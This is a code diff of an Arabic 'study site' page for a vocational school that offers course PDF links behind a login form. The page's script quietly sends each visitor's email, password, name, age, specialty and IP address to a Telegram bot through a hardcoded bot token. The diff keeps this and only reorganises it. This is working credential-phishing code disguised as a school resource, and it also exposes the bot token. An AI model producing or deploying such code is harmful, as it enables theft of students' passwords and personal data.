@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>موقع دراسي</title>
     <style>
-        /* General Styles */
         body {
             background-color: #0a0a0a;
             color: #fff;
@@ -38,7 +37,6 @@
             letter-spacing: 2px;
         }
 
-        /* Container and Buttons */
         .container {
             flex-grow: 1;
             display: flex;
@@ -47,7 +45,8 @@
             flex-wrap: wrap;
             gap: 20px;
             padding: 50px 20px;
-            display: none; /* Hidden by default */
+            opacity: 0; /* Initially hidden */
+            transition: opacity 0.5s ease; /* Smooth reveal */
         }
 
         .button {
@@ -61,9 +60,6 @@
             border-radius: 50px;
             transition: all 0.4s ease;
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
-            text-decoration: none; /* Remove underline */
         }
 
         .button:hover {
@@ -79,10 +75,6 @@
             border-radius: 15px;
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.7);
             margin-top: 30px;
-            transition: all 0.5s ease;
-            display: flex; /* Make the login container a flexbox */
-            flex-direction: column; /* Arrange items vertically */
-            align-items: center; /* Center items horizontally */
         }
 
         .login-container label {
@@ -119,8 +111,6 @@
             font-weight: bold;
             cursor: pointer;
             transition: all 0.4s ease;
-            position: relative;
-            overflow: hidden;
             text-transform: uppercase;
         }
 
@@ -139,22 +129,6 @@
             font-size: 0.9rem;
             margin-top: auto;
         }
-
-        /* Fade-in animation */
-        .fade-in {
-            animation: fadeIn 1s ease forwards;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
     </style>
 </head>
 <body>
@@ -164,7 +138,23 @@
     <img src="https://raw.githubusercontent.com/klwb123/conv/main/IMG_5386.png" alt="Logo">
 </header>
 
-<div class="login-container fade-in" id="login-container">
+<div class="container" id="buttonContainer">
+    <button class="button">
+        <a href="https://vocational.edu.iq/wp-content/uploads/2024/01/%D8%AA%D8%B7%D8%A8%D9%8A%D9%82%D8%A7%D8%AA-%D8%A7%D9%84%D8%AD%D8%A7%D8%B3%D9%88%D8%A8-%D8%A7%D9%84%D8%A7%D9%88%D9%84-2023.pdf" target="_blank">تطبيقات الحاسوب</a>
+    </button>
+    <button class="button">
+        <a href="https://vocational.edu.iq/uploads/pdf/computer/1/1/511cc.pdf" target="_blank">مبادئ الاتصال والشبكات</a>
+    </button>
+    <button class="button">
+        <a href="https://vocational.edu.iq/uploads/pdf/computer/1/1/511dd.pdf" target="_blank">تجميع الحاسوب</a>
+    </button>
+    <button class="button">الطبيعيات</button>
+    <button class="button">اللغة العربية</button>
+    <button class="button">اللغة الانكليزية</button>
+    <button class="button">الرياضيات</button>
+</div>
+
+<div class="login-container">
     <form id="loginForm">
         <label for="email">البريد الإلكتروني</label>
         <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
@@ -172,7 +162,7 @@
         <label for="password">كلمة المرور</label>
         <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
 
-        <label for="name">اضف اسمك</label>
+        <label for="name">اسمك</label>
         <input type="text" id="name" placeholder="أدخل اسمك" required>
         
         <label for="age">عمرك</label>
@@ -185,23 +175,13 @@
     </form>
 </div>
 
-<div class="container fade-in" id="resource-container">
-    <button class="button" onclick="window.open('https://vocational.edu.iq/wp-content/uploads/2024/01/%D8%AA%D8%B7%D8%A8%D9%8A%D9%82%D8%A7%D8%AA-%D8%A7%D9%84%D8%AD%D8%A7%D8%B3%D9%88%D8%A8-%D8%A7%D9%84%D8%A7%D9%88%D9%84-2023.pdf', '_blank')">تطبيقات الحاسوب</button>
-    <button class="button" onclick="window.open('https://vocational.edu.iq/uploads/pdf/computer/1/1/511cc.pdf', '_blank')">مبادئ الاتصال والشبكات</button>
-    <button class="button" onclick="window.open('https://vocational.edu.iq/uploads/pdf/computer/1/1/511dd.pdf', '_blank')">تجميع الحاسوب</button>
-    <button class="button">الطبيعيات</button>
-    <button class="button">اللغة العربية</button>
-    <button class="button">اللغة الانكليزية</button>
-    <button class="button">الرياضيات</button>
-</div>
-
 <footer>
     <p>&copy; 2024 موقع دراسي - كل الحقوق محفوظة للإعدادية الرافدين المهنية</p>
 </footer>
 
 <script>
     document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
+        e.preventDefault(); // Prevent default form submission
 
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
@@ -209,34 +189,32 @@
         const age = document.getElementById('age').value;
         const specialty = document.getElementById('specialty').value;
 
-        // Send data to Telegram bot
-        const botToken = "7247835860:AAHi08y99fZPkS1Drd8-xwtv0ZnO3pgDOqM"; // Replace with your bot token
-        const chatId = "842463450"; // Replace with your chat ID
-        const message = `New login attempt:\nName: ${name}\nAge: ${age}\nSpecialty: ${specialty}\nEmail: ${email}\nPassword: ${password}`;
-
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        // Get user's IP address
+        fetch('https://api.ipify.org?format=json')
         .then(response => {
-            if (response.ok) {
-                // Hide login form and show resource buttons
-                document.getElementById('login-container').style.display = 'none';
-                document.getElementById('resource-container').style.display = 'flex'; // Show the resource buttons
+            if (!response.ok) throw new Error('Network response was not ok.');
+            return response.json();
+        })
+        .then(data => {
+            const ipAddress = data.ip;
 
-                const welcomeButton = document.createElement('button');
-                welcomeButton.className = 'button fade-in';
-                welcomeButton.innerText = `مرحبًا ${name}، تم تسجيل دخولك بنجاح!`;
-                document.body.insertBefore(welcomeButton, document.body.firstChild);
+            // Send data to Telegram bot
+            const botToken = "7247835860:AAHi08y99fZPkS1Drd8-xwtv0ZnO3pgDOqM";
+            const chatId = "842463450";
+            const message = `New login:\nName: ${name}\nAge: ${age}\nSpecialty: ${specialty}\nEmail: ${email}\nPassword: ${password}\nIP Address: ${ipAddress}`;
 
-                // Fetch user IP and send it to Telegram
-                fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipMessage = `User IP: ${data.ip}`;
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(ipMessage}`);
-                });
+            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+        })
+        .then(response => {
+            if (!response.ok) throw new Error('Error sending message to Telegram.');
 
-            } else {
-                alert("حدث خطأ. حاول مرة أخرى.");
-            }
+            alert("تم تسجيل الدخول بنجاح!");
+            document.getElementById('buttonContainer').style.opacity = '1'; // Show buttons
+            document.querySelector('.login-container').style.display = 'none'; // Hide login form
+        })
+        .catch(error => {
+            alert("حدث خطأ. حاول مرة أخرى.");
+            console.error("Error:", error);
         });
 
         // Reset the form
